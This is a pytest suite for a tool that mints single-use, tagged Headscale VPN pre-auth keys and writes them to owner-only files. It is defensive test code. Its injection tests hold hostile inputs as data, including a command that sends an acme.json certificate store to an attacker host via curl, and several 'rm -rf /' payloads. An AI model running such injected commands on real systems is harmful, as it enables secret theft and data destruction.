"""One-off tagged pre-auth keys are minted from the segment declaration, not from argv.

VPN-ACL-016 (#2863). A tenant node is enrolled with a key that carries exactly
one tag -- the segment's hosts or clients tag -- so the ACL policy (VPN-ACL-014)
admits it to its segment and nothing else. The tag must come from the SOPS
segment declaration, never from the command line: a typo in argv mints a key
that admits a machine to the wrong segment, and a reusable key is a standing
invitation (the lesson of 2026-08-23).

The key itself is the one value this module must never leak: it is written to
an owner-only file, and everything printed or returned names the key's id,
never its material.
"""

from __future__ import annotations

import json
import os
import stat
import subprocess
from pathlib import Path

import pytest

from toolkit.features.headscale_authkey import (
    AuthKeyRefused,
    MintUnavailableError,
    build_create_command,
    default_ssh_target,
    mint,
    parse_create_output,
    parse_segment,
    resolve_owner_id,
    resolve_role_tag,
    write_owner_only,
)

KEY_MATERIAL = "hskey-auth-test-0001"

SEGMENT_JSON = json.dumps(
    {
        "owner": "tenant-example",
        "hosts_tag": "tag:tenant-example-hosts",
        "clients_tag": "tag:tenant-example-clients",
        "ports": [22, 3389],
    }
)

USERS_JSON = json.dumps(
    [
        {"id": "1", "name": "kubelab", "createdAt": "2026-01-01T00:00:00Z"},
        {"id": "2", "name": "tenant-example", "createdAt": "2026-01-01T00:00:00Z"},
    ]
)

CREATE_OUTPUT_JSON = json.dumps(
    {
        "key": KEY_MATERIAL,
        "id": "7",
        "createdAt": "2026-11-06T20:00:00Z",
        "expiration": "2026-11-06T21:00:00Z",
        "used": False,
        "ephemeral": False,
        "reusable": False,
        "aclTags": ["tag:tenant-example-hosts"],
    }
)


def _mock_mint(mocker, tmp_path, role="hosts", segment=SEGMENT_JSON, create_stdout=CREATE_OUTPUT_JSON):
    """Run mint() with SOPS and ssh mocked; return (result, subprocess.run mock)."""
    mocker.patch(
        "toolkit.features.headscale_authkey.SecretsManager",
        return_value=mocker.Mock(show_secret=mocker.Mock(return_value=segment)),
    )
    run = mocker.patch(
        "toolkit.features.headscale_authkey.subprocess.run",
        side_effect=[
            mocker.Mock(returncode=0, stdout=USERS_JSON, stderr=""),
            mocker.Mock(returncode=0, stdout=create_stdout, stderr=""),
            # Windows write_owner_only runs icacls through the same run().
            mocker.Mock(returncode=0, stdout="", stderr=""),
        ],
    )
    out = tmp_path / "key.out"
    result = mint("prod", "tenant-example", role, out, ssh_target="deployer@vps")
    return result, run, out


class TestSegmentParsing:
    def test_it_reads_the_declared_segment(self) -> None:
        segment = parse_segment(SEGMENT_JSON, "tenant-example")
        assert segment.owner == "tenant-example"
        assert segment.hosts_tag == "tag:tenant-example-hosts"
        assert segment.clients_tag == "tag:tenant-example-clients"

    def test_an_undeclared_segment_is_refused(self) -> None:
        """A SOPS miss is a refusal, not an empty segment: minting with no
        declaration would mint with no tag at all."""
        with pytest.raises(AuthKeyRefused, match="not declared"):
            parse_segment(None, "ghost-segment")

    def test_a_malformed_segment_is_refused(self) -> None:
        broken = json.dumps({"owner": "tenant-example", "hosts_tag": "tag:x"})
        with pytest.raises(AuthKeyRefused, match="malformed"):
            parse_segment(broken, "tenant-example")

    def test_a_tag_without_the_tag_prefix_is_refused(self) -> None:
        broken = json.dumps(
            {
                "owner": "tenant-example",
                "hosts_tag": "tenant-example-hosts",
                "clients_tag": "tag:tenant-example-clients",
                "ports": [22],
            }
        )
        with pytest.raises(AuthKeyRefused, match="tag:"):
            parse_segment(broken, "tenant-example")

    def test_a_non_json_segment_is_refused(self) -> None:
        with pytest.raises(AuthKeyRefused, match="malformed"):
            parse_segment("not json", "tenant-example")


class TestRoleResolution:
    def test_hosts_role_resolves_the_hosts_tag(self) -> None:
        assert resolve_role_tag(parse_segment(SEGMENT_JSON, "s"), "hosts") == "tag:tenant-example-hosts"

    def test_clients_role_resolves_the_clients_tag(self) -> None:
        assert resolve_role_tag(parse_segment(SEGMENT_JSON, "s"), "clients") == "tag:tenant-example-clients"

    def test_an_undeclared_role_is_refused(self) -> None:
        """The role is hosts|clients and nothing else -- a third 'role' would
        silently pick a tag nobody declared for it."""
        with pytest.raises(AuthKeyRefused, match="role"):
            resolve_role_tag(parse_segment(SEGMENT_JSON, "s"), "admin")


class TestCommandBuilding:
    def test_the_tag_comes_from_the_segment_not_argv(self) -> None:
        command = build_create_command("2", "tag:tenant-example-hosts", "1h", ephemeral=False)
        assert "--tags tag:tenant-example-hosts" in command
        assert command.count("--tags") == 1

    def test_the_key_is_never_reusable(self) -> None:
        """A reusable key admits any number of machines until it expires -- the
        exact standing invitation the 2026-08-23 audit found live."""
        command = build_create_command("2", "tag:tenant-example-hosts", "1h", ephemeral=False)
        assert "--reusable" not in command

    def test_a_host_key_is_not_ephemeral(self) -> None:
        command = build_create_command("2", "tag:tenant-example-hosts", "1h", ephemeral=False)
        assert "--ephemeral" not in command

    def test_a_client_key_is_ephemeral(self) -> None:
        command = build_create_command("2", "tag:tenant-example-clients", "1h", ephemeral=True)
        assert "--ephemeral" in command

    def test_expiration_is_passed_through(self) -> None:
        command = build_create_command("2", "tag:tenant-example-hosts", "4h", ephemeral=False)
        assert "--expiration 4h" in command

    def test_the_owner_id_is_passed_as_user(self) -> None:
        command = build_create_command("2", "tag:tenant-example-hosts", "1h", ephemeral=False)
        assert "--user 2" in command

    @pytest.mark.parametrize(
        "bad_id",
        ["20; curl attacker/?k=$(cat /data/acme.json)", "$(id)", "1 && rm -rf /", "", "abc"],
    )
    def test_a_non_numeric_user_id_is_refused_before_it_reaches_a_shell(self, bad_id) -> None:
        """The command string is executed by a remote shell; the guard belongs
        where the string is built, not where today's caller happens to be careful."""
        with pytest.raises(ValueError, match="numeric"):
            build_create_command(bad_id, "tag:x", "1h", ephemeral=False)

    def test_a_tag_without_prefix_is_refused_at_the_boundary(self) -> None:
        with pytest.raises(ValueError, match="tag:"):
            build_create_command("2", "tenant-example-hosts", "1h", ephemeral=False)

    @pytest.mark.parametrize("bad_exp", ["1h; rm -rf /", "abc", "", "-1h"])
    def test_a_malformed_expiration_is_refused(self, bad_exp) -> None:
        with pytest.raises(ValueError, match="expiration"):
            build_create_command("2", "tag:x", bad_exp, ephemeral=False)

    def test_the_guard_is_a_raise_not_an_assert(self) -> None:
        """Assertions vanish under `python -O`; a guard an interpreter flag can
        switch off is not a guard."""
        import inspect

        src = inspect.getsource(build_create_command)
        assert "raise ValueError" in src
        assert "assert " not in src


class TestOwnerResolution:
    def test_the_owner_is_resolved_to_its_numeric_id(self) -> None:
        assert resolve_owner_id(USERS_JSON, "tenant-example") == "2"

    def test_a_missing_owner_is_refused(self) -> None:
        with pytest.raises(AuthKeyRefused, match="not found"):
            resolve_owner_id(USERS_JSON, "ghost")

    def test_an_ambiguous_owner_is_refused(self) -> None:
        duplicated = json.dumps(
            [
                {"id": "2", "name": "tenant-example"},
                {"id": "3", "name": "tenant-example"},
            ]
        )
        with pytest.raises(AuthKeyRefused, match="ambiguous"):
            resolve_owner_id(duplicated, "tenant-example")

    def test_an_unparseable_user_list_raises(self) -> None:
        with pytest.raises(MintUnavailableError):
            resolve_owner_id("garbage", "tenant-example")


class TestOutputParsing:
    def test_it_reads_the_key_and_id(self) -> None:
        key, key_id = parse_create_output(CREATE_OUTPUT_JSON)
        assert key == KEY_MATERIAL
        assert key_id == "7"

    def test_a_nested_wrapper_is_unwrapped(self) -> None:
        """`--output json` shape is unverified against the running binary; a
        single nested object carrying the key is accepted rather than guessed
        against."""
        wrapped = json.dumps({"preAuthKey": json.loads(CREATE_OUTPUT_JSON)})
        key, key_id = parse_create_output(wrapped)
        assert key == KEY_MATERIAL
        assert key_id == "7"

    def test_an_output_without_a_key_echoes_only_field_names(self) -> None:
        """The failure message may name the fields it saw, never their values:
        stderr and exception text land in logs, and the key is the one value
        that must never reach them."""
        hostile = json.dumps({"id": "7", "note": "hunter2-secret-value"})
        with pytest.raises(MintUnavailableError) as excinfo:
            parse_create_output(hostile)
        message = str(excinfo.value)
        assert "hunter2-secret-value" not in message
        assert "id" in message

    def test_garbage_output_is_refused_without_echoing_it(self) -> None:
        with pytest.raises(MintUnavailableError) as excinfo:
            parse_create_output("hskey-auth-test-9999")
        assert "test-9999" not in str(excinfo.value)


class TestKeyDelivery:
    def test_the_key_lands_in_the_out_file_and_nowhere_else(self, mocker, tmp_path, capsys) -> None:
        result, _run, out = _mock_mint(mocker, tmp_path)
        assert out.read_text(encoding="utf-8") == KEY_MATERIAL
        assert result.key_id == "7"
        # The returned summary and everything printed name the id, never the key.
        assert not hasattr(result, "key")
        assert KEY_MATERIAL not in repr(result)
        assert KEY_MATERIAL not in capsys.readouterr().out
        assert KEY_MATERIAL not in capsys.readouterr().err

    def test_the_mint_summary_carries_the_declared_tag(self, mocker, tmp_path) -> None:
        result, _run, _out = _mock_mint(mocker, tmp_path)
        assert result.tag == "tag:tenant-example-hosts"
        assert result.role == "hosts"

    def test_a_client_mint_passes_ephemeral(self, mocker, tmp_path) -> None:
        _result, run, _out = _mock_mint(mocker, tmp_path, role="clients")
        create_command = run.call_args_list[1].args[0][-1]
        assert "--ephemeral" in create_command

    def test_the_create_call_maps_every_argument(self, mocker, tmp_path) -> None:
        """AC1 end to end: tag from the segment, numeric owner id, expiration
        passthrough, single-use -- and never --reusable."""
        _result, run, _out = _mock_mint(mocker, tmp_path)
        create_command = run.call_args_list[1].args[0][-1]
        assert "--user 2" in create_command
        assert "--tags tag:tenant-example-hosts" in create_command
        assert "--expiration 1h" in create_command
        assert "--reusable" not in create_command
        assert "--ephemeral" not in create_command

    def test_the_create_call_requests_json_output(self, mocker, tmp_path) -> None:
        """`--output` is a global flag defaulting to human-readable; without it
        the mint refuses on parse after the key already exists on the VPS."""
        _result, run, _out = _mock_mint(mocker, tmp_path)
        create_command = run.call_args_list[1].args[0][-1]
        assert "--output json" in create_command

    def test_an_existing_out_file_is_never_overwritten(self, mocker, tmp_path) -> None:
        out = tmp_path / "key.out"
        out.write_text("previous-content", encoding="utf-8")
        with pytest.raises(AuthKeyRefused, match="exists"):
            write_owner_only(out, KEY_MATERIAL)
        assert out.read_text(encoding="utf-8") == "previous-content"

    @pytest.mark.skipif(os.name == "nt", reason="POSIX mode bits")
    def test_the_file_is_owner_only_on_posix(self, tmp_path) -> None:
        out = tmp_path / "key.out"
        write_owner_only(out, KEY_MATERIAL)
        assert stat.S_IMODE(out.stat().st_mode) == 0o600

    @pytest.mark.skipif(os.name != "nt", reason="Windows ACLs")
    def test_the_file_is_owner_only_on_windows(self, tmp_path) -> None:
        out = tmp_path / "key.out"
        write_owner_only(out, KEY_MATERIAL)
        listing = subprocess.run(  # noqa: S603
            ["icacls", str(out)],
            capture_output=True,
            text=True,
            check=True,
            encoding=None,  # icacls prints in the locale code page
        ).stdout
        # Inheritance removed: no inherited ACE marker survives.
        assert "(I)" not in listing

    def test_the_file_is_empty_while_the_acl_is_applied(self, mocker, tmp_path) -> None:
        """#3196: hardening runs BEFORE the secret is written, so the
        create-to-ACL window exposes an empty file and never key material."""
        out = tmp_path / "key.out"
        seen: list[bytes] = []

        def inspect_then_harden(path: Path) -> None:
            seen.append(Path(path).read_bytes())

        mocker.patch(
            "toolkit.features.headscale_authkey._restrict_to_owner",
            side_effect=inspect_then_harden,
        )
        write_owner_only(out, KEY_MATERIAL)
        assert seen == [b""]
        assert out.read_text(encoding="utf-8") == KEY_MATERIAL

    def test_an_acl_failure_removes_the_file_and_names_the_key(self, mocker, tmp_path) -> None:
        """#3196: a failed `icacls` must not leave the key readable on disk. The
        file is unlinked, and the error names the key id -- the key was already
        created on the VPS, so an operator who reads only "could not write"
        leaves a live pre-auth key behind."""
        mocker.patch(
            "toolkit.features.headscale_authkey.SecretsManager",
            return_value=mocker.Mock(show_secret=mocker.Mock(return_value=SEGMENT_JSON)),
        )
        mocker.patch(
            "toolkit.features.headscale_authkey.subprocess.run",
            side_effect=[
                mocker.Mock(returncode=0, stdout=USERS_JSON, stderr=""),
                mocker.Mock(returncode=0, stdout=CREATE_OUTPUT_JSON, stderr=""),
            ],
        )
        mocker.patch(
            "toolkit.features.headscale_authkey._restrict_to_owner",
            side_effect=subprocess.CalledProcessError(1, "icacls"),
        )
        out = tmp_path / "key.out"
        with pytest.raises(MintUnavailableError) as excinfo:
            mint("prod", "tenant-example", "hosts", out, ssh_target="deployer@vps")
        assert not out.exists()
        assert "7" in str(excinfo.value)
        assert KEY_MATERIAL not in str(excinfo.value)

    def test_a_write_failure_also_removes_the_file(self, mocker, tmp_path) -> None:
        """The cleanup is not ACL-specific: a partial secret file is no better
        than a readable one."""
        mocker.patch("toolkit.features.headscale_authkey._restrict_to_owner")
        mocker.patch(
            "toolkit.features.headscale_authkey.os.write",
            side_effect=OSError("disk full"),
        )
        out = tmp_path / "key.out"
        with pytest.raises(MintUnavailableError, match="removed"):
            write_owner_only(out, KEY_MATERIAL)
        assert not out.exists()


class TestTransport:
    def test_a_failed_create_raises(self, mocker, tmp_path) -> None:
        mocker.patch(
            "toolkit.features.headscale_authkey.SecretsManager",
            return_value=mocker.Mock(show_secret=mocker.Mock(return_value=SEGMENT_JSON)),
        )
        mocker.patch(
            "toolkit.features.headscale_authkey.subprocess.run",
            side_effect=[
                mocker.Mock(returncode=0, stdout=USERS_JSON, stderr=""),
                mocker.Mock(returncode=1, stdout="", stderr="user not found"),
            ],
        )
        with pytest.raises(MintUnavailableError, match="could not mint"):
            mint("prod", "tenant-example", "hosts", tmp_path / "key.out", ssh_target="deployer@vps")

    def test_an_unsafe_container_is_refused_before_any_ssh(self, mocker, tmp_path) -> None:
        run = mocker.patch("toolkit.features.headscale_authkey.subprocess.run")
        with pytest.raises(ValueError, match="unsafe container"):
            mint(
                "prod",
                "tenant-example",
                "hosts",
                tmp_path / "key.out",
                ssh_target="deployer@vps",
                container="head; rm -rf /",
            )
        run.assert_not_called()

    def test_the_ssh_target_is_derived_from_the_ssot_not_hardcoded(self, mocker) -> None:
        """Both halves of the target are SSOT values (the rule that killed the
        hardcoded `deployer@162.55.57.175` default in #1247). The PUBLIC ip:
        Headscale *is* the VPN, so a check over the VPN cannot report on a VPN
        that is down."""
        fake_cm = mocker.patch("toolkit.features.headscale_authkey.ConfigurationManager")
        fake_cm.return_value.get_merged_config.return_value = {
            "networking": {
                "ssh_users": {"cloud": "deployer"},
                "vps": {"public_ip": "203.0.113.7"},
            }
        }
        assert default_ssh_target() == "deployer@203.0.113.7"
